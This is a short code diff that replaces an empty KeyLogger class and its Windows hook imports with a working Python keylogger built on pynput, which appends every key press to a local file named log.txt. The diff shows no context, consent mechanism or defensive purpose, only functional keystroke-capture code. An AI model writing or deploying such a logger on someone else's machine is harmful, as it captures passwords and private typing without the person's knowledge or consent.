@@ -1,9 +1,10 @@
-import win32api
-import win32console
-import win32gui
-import pythoncom
-import pyHook
+from pynput.keyboard import Key, Listener
 
-class KeyLogger:
-    pass
+def on_press(key):
+    key = str(key)
+    with open("log.txt", "a") as f:
+        f.write(key + "\n")
+
+with Listener(on_press=on_press) as listener:
+    listener.join()
 
